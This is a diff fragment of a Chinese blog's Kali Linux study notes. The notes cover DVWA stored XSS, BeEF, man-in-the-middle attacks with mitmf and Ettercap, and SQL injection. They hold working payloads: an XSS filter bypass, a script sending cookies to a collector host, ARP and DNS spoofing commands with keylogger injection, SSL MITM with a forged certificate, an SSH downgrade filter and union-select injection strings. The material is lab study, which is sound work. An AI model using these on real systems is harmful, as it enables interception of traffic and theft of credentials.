+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $message = trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">   $name    = trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">   </span><br><span class="line">   // Sanitize message input</span><br><span class="line">   $message = stripslashes($message);</span><br><span class="line">   $message = mysql_real_escape_string($message);</span><br><span class="line">   </span><br><span class="line">   // Sanitize name input</span><br><span class="line">   $name = mysql_real_escape_string($name);</span><br><span class="line">  </span><br><span class="line">   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;);&quot;;</span><br><span class="line">   </span><br><span class="line">   $result = mysql_query($query) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DVWA的XSS stored（Medium）<ul>
+<li>绕过方法：&amp;message基本无法注入，&amp;name可以通过<code>&lt;scri&lt;script&gt;pt&gt;alert(&#39;xss&#39;);&lt;/scri&lt;script&gt;pt&gt;</code>绕过 ▲ 2020.1.20&amp;name不需要绕过注入</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $message = trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">   $name    = trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">   </span><br><span class="line">   // Sanitize message input</span><br><span class="line">   $message = trim(strip_tags(addslashes($message)));</span><br><span class="line">   $message = mysql_real_escape_string($message);</span><br><span class="line">   $message = htmlspecialchars($message);</span><br><span class="line">    </span><br><span class="line">   // Sanitize name input</span><br><span class="line">   $name = str_replace(&apos;&lt;script&gt;&apos;, &apos;&apos;, $name);</span><br><span class="line">   $name = mysql_real_escape_string($name);</span><br><span class="line">  </span><br><span class="line">   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;);&quot;;</span><br><span class="line">   </span><br><span class="line">   $result = mysql_query($query) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DVWA的XSS stored（High）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $message = trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">   $name    = trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">   </span><br><span class="line">   // Sanitize message input</span><br><span class="line">   $message = stripslashes($message);</span><br><span class="line">   $message = mysql_real_escape_string($message);</span><br><span class="line">   $message = htmlspecialchars($message);</span><br><span class="line">   </span><br><span class="line">   // Sanitize name input</span><br><span class="line">   $name = stripslashes($name);</span><br><span class="line">   $name = mysql_real_escape_string($name); </span><br><span class="line">   $name = htmlspecialchars($name);</span><br><span class="line">  </span><br><span class="line">   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;);&quot;;</span><br><span class="line">   </span><br><span class="line">   $result = mysql_query($query) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="9-XSS-DOM"><a href="#9-XSS-DOM" class="headerlink" title="9. XSS DOM"></a>9. XSS DOM</h4><ul>
+<li>DOM型XSS<ul>
+<li>一套JS和其他语言可调用的标准的API</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://www.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=f66f-xKTDzcuepCGP1R9qnf5yzSEpWewBDFOJ4ZgiR74rXX7YTpJS9ZthPIXIwy-zMuvL6LE6JC52VMb9VnTpLNb9_SrR8jGaoghAOmTQyKrlr9h6MCdKg&file_name=/XSS-DOM.PNG" alt="DOM型XSS"></p>
+<ul>
+<li><code>&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http:// 192.168.20.8:88/log?&quot;+escape(document.cookie);&lt;/script&gt;</code></li>
+</ul>
+<h4 id="10-BEEF"><a href="#10-BEEF" class="headerlink" title="10. BEEF"></a>10. BEEF</h4><ul>
+<li>浏览器攻击面（不可忽视，基本上最接近用户）<ul>
+<li>应用普遍转移到B/S架构，浏览器成为统一客户端程序</li>
+<li>结合社会工程学方法对浏览器进行攻击</li>
+<li>攻击浏览器用户</li>
+<li>通过注入的JS脚本，利用浏览器攻击其他网站</li>
+</ul>
+</li>
+<li>BeFF（Browser exploitation framework）<ul>
+<li>生成、交付payload</li>
+<li>Ruby语言编写</li>
+<li>服务器端：管理hooked客户端</li>
+<li>客户端：运行客户端浏览器的Javascript脚本（hook）</li>
+</ul>
+</li>
+<li>攻击手段<ul>
+<li>利用网站XSS漏洞实现攻击</li>
+<li>诱使客户端访问含有hook的伪造站点</li>
+<li>结合中间人攻击注入hook脚本</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐中间人攻击/劫持
+运行商：链路劫持，插入js脚本，来宣传广告，黑色收入
+Hacker：CDN劫持，在CDN节点上插入js脚本</code></pre></blockquote>
+<ul>
+<li>常见用途<ul>
+<li>键盘记录器</li>
+<li>网络扫描</li>
+<li>浏览器信息收集</li>
+<li>绑定shell</li>
+<li>与metasploit集成</li>
+</ul>
+</li>
+<li>演示页面：http://<IP_BeEF_Server>:3000/demos/basic.html</li>
+<li>hook.js：<a href="http://127.0.0.1:3000/hook.js" target="_blank" rel="noopener">http://127.0.0.1:3000/hook.js</a></li>
+<li>BeEF登陆界面：username:beef/password:beef ▲ 2020.1.20修改密码为admin</li>
+<li>BeEF用户界面：<a href="http://127.0.0.1:3000/ul/panel" target="_blank" rel="noopener">http://127.0.0.1:3000/ul/panel</a></li>
+<li>DVWA的XSS stored（$name进行hook，$message不注入）</li>
+<li>Details：<ul>
+<li>浏览器、插件版本信息；操作系统信息</li>
+</ul>
+</li>
+<li>Logs：<ul>
+<li>浏览器动作：焦点变化、鼠标点击、信息输入</li>
+</ul>
+</li>
+<li>Commands：命令模块<ul>
+<li>绿色模块：表示模块适合目标浏览器，并且执行结果被客户端不可见</li>
+<li>红色模块：表示模块不适合当前用户，有些红色模块也可以正常执行</li>
+<li>橙色模块：模块可用，但结果对用户可见（CAM弹窗申请权限等）</li>
+<li>灰色模块：模块未在目标浏览器上测试过</li>
+</ul>
+</li>
+<li>主要模块<ul>
+<li>Browsers</li>
+<li>Exploits</li>
+<li>Host</li>
+<li>Persistence（持久性）</li>
+<li>Network</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AB)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E6%B3%A8%E5%85%A5XSS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AB)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E6%B3%A8%E5%85%A5XSS/" itemprop="url">Kali Linux笔记(五十八)：SSL、TLS中间人攻击--注入XSS</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T15:08:48+08:00">
+                2020-01-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-中间人攻击（注入XSS）"><a href="#1-中间人攻击（注入XSS）" class="headerlink" title="1. 中间人攻击（注入XSS）"></a>1. 中间人攻击（注入XSS）</h4><ul>
+<li>注入XSS<ul>
+<li>结合ARP欺骗或DNS代理欺骗，实现中间人攻击</li>
+<li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码 </li>
+<li>一旦得手，影响范围巨大 </li>
+<li>如果中间人发生在运营商线路上，很难引起用户注意，隐蔽性高 </li>
+</ul>
+</li>
+</ul>
+<h4 id="2-中间人攻击–Mitmf-Beef"><a href="#2-中间人攻击–Mitmf-Beef" class="headerlink" title="2. 中间人攻击–Mitmf*Beef"></a>2. 中间人攻击–Mitmf*Beef</h4><ul>
+<li>Mitmf 安装（无核心技术内容，冗杂性大）▲ 2020.1.24一些依赖包以及安装包无法找到<ul>
+<li>曾经号称最好用的中间人攻击工具（kali 2.0后默认未安装） </li>
+<li><strong><code>🔺命令：apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</code></strong> </li>
+<li><strong><code>🔺命令：apt-get install mitmf</code></strong> </li>
+<li><strong><code>🔺命令：pip uninstall twisted</code></strong> </li>
+<li><strong><code>🔺命令：wget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted15.5.0.tar.bz2</code></strong> </li>
+<li><strong><code>🔺命令：pip install ./Twisted-15.5.0.tar.bz2</code></strong></li>
+</ul>
+</li>
+<li>启动beef <ul>
+<li><strong><code>🔺命令：cd /usr/share/beef-xss/</code></strong> </li>
+<li><strong><code>🔺命令：./beef</code></strong> ▲ 2020.1.24修改为beef-xss（命令存在Bash中）</li>
+</ul>
+</li>
+<li>mitmf中间人注入xss脚本（结合Beef）<ul>
+<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 1.1.1.1（正确网关地址） --target 1.1.1.2 --inject --js-url http://1.1.1.3:3000/hook.js</code></strong> （ARP地址欺骗）</li>
+</ul>
+</li>
+<li>mitmf中间人注入xss脚本（不结合Beef） <ul>
+<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</code></strong>（ARP地址欺骗）</li>
+<li>–upsidedownternet（图片倒转）、–screen（/var/log/mitmf，屏幕快照） </li>
+<li>–ferretng（抓取cookie）、–browserprofiler（浏览器及插件信息） </li>
+<li>–smbtrap（抓取smb）、–smbauth（smb认证）</li>
+<li>–hsts（新的安全协议）<ul>
+<li>HTTP Strict Transport Security </li>
+<li>防止协议降级、cookie窃取 </li>
+<li>安全策略通过HTTP响应头”Strict-Transport-Security”实施 </li>
+<li>限制user-agent、https等</li>
+</ul>
+</li>
+<li>–filepwn（EXE执行程序的下载，插入后门程序）<ul>
+<li>凌空插后门 </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-中间人攻击–Ettercap"><a href="#3-中间人攻击–Ettercap" class="headerlink" title="3. 中间人攻击–Ettercap"></a>3. 中间人攻击–Ettercap</h4><ul>
+<li>Ettercap ▲ 2020.1.24Ettercap有点小问题，关于主机发现这一模块<ul>
+<li>统一的中间人攻击工具 </li>
+<li>转发MAC与本机相同，但IP与本机不同的数据包 </li>
+<li>支持SSH1、SSL中间人攻击</li>
+</ul>
+</li>
+<li>模块划分 <ul>
+<li>Snifer </li>
+<li>MITM </li>
+<li>Filter </li>
+<li>Log </li>
+<li>Plugin</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-Ettercap–Snifer"><a href="#4-Ettercap–Snifer" class="headerlink" title="4. Ettercap–Snifer"></a>4. Ettercap–Snifer</h4><ul>
+<li>Snifer<ul>
+<li>负责数据包转发</li>
+<li>Unified<ul>
+<li>单网卡情况下独立完成三层包转发</li>
+<li>始终禁用内核IP_Forward功能</li>
+</ul>
+</li>
+<li>Bridge <ul>
+<li>双网卡情况下的一层MITM模式</li>
+<li>可作为IPS过滤数据包</li>
+<li>不可在网关上使用（透明网桥）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-Ettercap–MITM"><a href="#5-Ettercap–MITM" class="headerlink" title="5. Ettercap–MITM"></a>5. Ettercap–MITM</h4><ul>
+<li>MITM <ul>
+<li>把流量重定向到ettercap主机上 </li>
+<li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li>
+</ul>
+</li>
+<li>实现MITM的方法 <ul>
+<li>ARP（一般为动态类型的ARP表）</li>
+<li>ICMP <ul>
+<li>ICMP路由重定向，半双工，回包不经过Kali（去包回包都经过Kali为全双工）</li>
+<li>-M icmp:00:11:22:33:44:55/10.0.0.1（真实网关的MAC/IP）</li>
+</ul>
+</li>
+<li>DHCP <ul>
+<li>修改网关地址，半双工，回包不经过Kali</li>
+<li>DHCP发包过程Discover、Offer、Resquest、ACK</li>
+<li>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1（DNS）</li>
+</ul>
+</li>
+<li>Switch Port Stealing（交换机端口窃取）<ul>
+<li>交换机根据源MAC地址更新</li>
+<li>flood目标地址是本机，源地址是受害者的包（向交换机发送大量泛洪攻击）</li>
+<li>适用于ARP静态绑定的环境（arp -s → 添加静态绑定的ARP）</li>
+<li>-M port /1.1.1.1/ /1.1.1.2/ </li>
+</ul>
+</li>
+<li>NDP <ul>
+<li>IPv6协议欺骗技术</li>
+<li>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Linux2.4以上内核对ARP地址欺骗的约束 <ul>
+<li>收到非请求的ARP响应包，不更新本地ARP缓存 </li>
+<li>Ettercap使用ARP request包进行攻击 </li>
+</ul>
+</li>
+<li>Solaris不根据ARP包更新本地ARP缓存 <ul>
+<li>Ettercap使用先发ICMP包来更新ARP缓存</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-Ettercap–准备"><a href="#6-Ettercap–准备" class="headerlink" title="6. Ettercap–准备"></a>6. Ettercap–准备</h4><ul>
+<li>用户操作界面 <ul>
+<li>-T 文本界面（文本字符）</li>
+<li>-G 图形界面 </li>
+<li>-C 基于文本的图形界面（文本类似图形化）</li>
+<li>-D 后台模式 </li>
+</ul>
+</li>
+<li>指定目标 <ul>
+<li>IPv4：MAC/IPv4/Ports </li>
+<li>IPv6：MAC/IPv4/IPv6/Ports </li>
+<li>/10.0.0.1−5;10.0.1.33/20−25,80,110</li>
+</ul>
+</li>
+<li>权限 <ul>
+<li>主配置文件：/etc/ettercap/etter.conf</li>
+<li>需要root权限打开链路层Socket连接，然后使用nobody账号运行 </li>
+<li>日志写入目录需要nobody有写入权 </li>
+<li>修改etter.conf：EC_UID=65534/EC_GID=65534 → EC_UID=0/EC_GID=0</li>
+</ul>
+</li>
+<li>基于伪造证书的SSL MITIM <ul>
+<li>Bridge模式不支持SSL MITM ▲ 2020.1.24报额外参数的错误</li>
+<li><strong><code>🔺命令：openssl genrsa −out etter.ssl.crt 1024</code></strong> </li>
+<li><strong><code>🔺命令：openssl req −new−keyetter.ssl.crt −out tmp.csr</code></strong> </li>
+<li><strong><code>🔺命令：openssl x509 −req −days 1825 −in tmp.csr −signkey etter.ssl.crt −out tmp.new</code></strong> </li>
+<li><strong><code>🔺命令：cat tmp.new&gt;&gt;etter.ssl.crt</code></strong></li>
+<li><strong><code>🔺命令：rm −f tmp.newtmp.csr</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="7-Ettercap–字符模式"><a href="#7-Ettercap–字符模式" class="headerlink" title="7. Ettercap–字符模式"></a>7. Ettercap–字符模式</h4><ul>
+<li>参数<ul>
+<li>-M（MITM技术）</li>
+<li>-F（过滤器）</li>
+<li>-P（模块）</li>
+<li>-w（网络流量记录）</li>
+<li>-l（简单记录日志）</li>
+<li>-L（记录所有日志信息）</li>
+<li>-m（账号密码信息）</li>
+<li>-q（安静模式/有用的信息）</li>
+</ul>
+</li>
+<li>MITM攻击<ul>
+<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></strong></li>
+<li>找一个FTP服务器</li>
+<li>输入账号/密码</li>
+<li>查看ettercap字符界面</li>
+</ul>
+</li>
+<li>Ettercap 日志查看 ▲ 2020.1.24查看无权限<ul>
+<li><strong><code>🔺命令：cat message</code></strong>（root目录下）</li>
+<li><strong><code>🔺命令：ls log发现文件是加密信息</code></strong></li>
+<li><strong><code>🔺命令：etterlog -p log.eci 查看获取的密码</code></strong></li>
+<li><strong><code>🔺命令：etterlog -c log.ecp 列出Log中的连接</code></strong></li>
+<li><strong><code>🔺命令：etterlog -c -f //1.1.1.1/ log.ecp</code></strong></li>
+<li><strong><code>🔺命令：etterlog -B -n -s -F TCP:1.1.1.1:20;1.1.1.2:1234 log.ecp &gt; aa 选择相应的连接并榨取文件</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="8-Ettercap–图形界面"><a href="#8-Ettercap–图形界面" class="headerlink" title="8. Ettercap–图形界面"></a>8. Ettercap–图形界面</h4><ul>
+<li>Sniff → Unified/Bridge sniffing → 网卡</li>
+<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
+<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
+<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
+<li>Start → Start sniffing</li>
+<li>找一个FTP服务器</li>
+<li>输入账号/密码</li>
+<li>查看ettercap图形界面</li>
+</ul>
+<h4 id="9-Ettercap–SSL中间人攻击"><a href="#9-Ettercap–SSL中间人攻击" class="headerlink" title="9. Ettercap–SSL中间人攻击"></a>9. Ettercap–SSL中间人攻击</h4><ul>
+<li>SSL MITM（默认无开启，需要在配置文件中修改，图形界面）<ul>
+<li><strong><code>🔺命令：vi /etc/ettercap/etter.conf</code></strong>（Linux → The second iptables）</li>
+<li>Sniff → Unified/Bridge sniffing → 网卡</li>
+<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
+<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
+<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
+<li>Start → Start sniffing</li>
+<li>找一个有SSL页面</li>
+<li>输入账号/密码</li>
+<li>查看ettercap图形界面</li>
+</ul>
+</li>
+</ul>
+<h4 id="10-Ettercap–DNS欺骗"><a href="#10-Ettercap–DNS欺骗" class="headerlink" title="10. Ettercap–DNS欺骗"></a>10. Ettercap–DNS欺骗</h4><ul>
+<li>DNS欺骗（图形界面） <ul>
+<li>dns_spoof插件配置文件 </li>
+<li><strong><code>🔺命令：vi /etc/ettercap/etter.dns</code></strong>（修改欺骗的域名对应的IP地址）</li>
+<li>Plugins → Load a plugins → Load ec_dns_spoof.so</li>
+<li>Plugins → Manage the plugins → 双击dns_spoof启动</li>
+<li>Sniff → Unified/Bridge sniffing → 网卡</li>
+<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
+<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
+<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
+<li>Start → Start sniffing</li>
+<li>找一个有SSL页面</li>
+<li>输入账号/密码</li>
+<li>查看ettercap图形界面</li>
+</ul>
+</li>
+<li>DNS欺骗（字符界面）<ul>
+<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -P dns_spoof</code></strong></li>
+<li><strong><code>🔺命令：ipconfig /flushdns</code></strong></li>
+<li><strong><code>🔺命令：ping 欺骗的域名</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="11-Ettercap–Filter"><a href="#11-Ettercap–Filter" class="headerlink" title="11. Ettercap–Filter"></a>11. Ettercap–Filter</h4><ul>
+<li>Filter <ul>
+<li>/usr/share/ettercap/</li>
+<li>▲ SSH-2.xx / SSH-1.99（既支持SSH-1，也支持SSH-2） / SSH-1.51</li>
+<li>etter.filter.ssh（ssh过滤文件，把SSH-2.xx/SSH-1.99转变为SSH-1.51）</li>
+<li><strong><code>🔺命令：etterfilter etter.filter.ssh -o ssh.ef</code></strong></li>
+<li><strong><code>🔺命令：mv ssh.ef /root</code></strong></li>
+<li>直接调用 -F ssh.ef（若发送SSH-1.99，则降级SSH-1.99为SSH-1.51）</li>
+</ul>
+</li>
+<li>替换HTTP内容（图片的内容可以替换为一个EXE或者脚本文件）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (ip.proto == TCP &amp;&amp; tcp.src == 80) &#123; </span><br><span class="line">     msg(&quot;data on TCP 80\n&quot;); </span><br><span class="line">         replace(&quot;img src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG SRC=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); </span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%83)%EF%BC%9AAJAX%E3%80%81Web%20Server/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2250,761 +3350,6 @@ lsb_release -a</code></pre></blockquote>
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B9%9D)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B9%9D)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E6%B3%A8%E5%85%A5/" itemprop="url">Kali Linux笔记(四十九)：手动漏洞挖掘--SQL注入</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T20:11:22+08:00">
-                2020-01-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-五种判断机制"><a href="#1-五种判断机制" class="headerlink" title="1. 五种判断机制"></a>1. 五种判断机制</h4><ul>
-<li>服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器（数据库调用或系统调用）</li>
-<li>用户登录判断<ul>
-<li>SELECT * FROM users WHERE user=’uname’ AND password=’password’</li>
-<li>SELECT * FROM users WHERE user=’uname’ AND password=”OR”=”</li>
-</ul>
-</li>
-<li>基于报错的检测方法（low）<ul>
-<li>‘ “ % ()</li>
-</ul>
-</li>
-<li>基于布尔的检测<ul>
-<li>1’ and ‘1’=’1 / 1’ and ‘1（真）</li>
-<li>1’ and ‘1’=’2 / 1’ and ‘0（假）</li>
-</ul>
-</li>
-<li>表列数/显示信息位于哪一列<ul>
-<li>‘order by 9–+（按查询列号排序）（注释符：–）</li>
-<li>select * 时表字段数=查询字段数</li>
-</ul>
-</li>
-<li>联合查询<ul>
-<li>‘union select 1,2–+ </li>
-<li>‘union all select database()/user()/version(),2– +</li>
-</ul>
-</li>
-<li>‘union select database(),substring index(USER(),”@”,1)–+（切分字段）</li>
-<li>DB用户：user() </li>
-<li>DB版本：version()</li>
-<li>全局函数：@@datadir、@@hostname、@@VERSION、@@version_compile_os</li>
-<li>当前库：database()</li>
-<li>ASCII转字符：char()</li>
-<li>连接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version())</li>
-<li>计算哈希：md5()</li>
-<li>Mysql数据结构<ul>
-<li>information_schema</li>
-</ul>
-</li>
-<li>所有库所有表/统计每库中表的数量<ul>
-<li>‘union select table_name,table_schema from information_schema.tables–+</li>
-<li>‘union select table_schema,count(*) from information_schema.tables group by table_schema–+</li>
-</ul>
-</li>
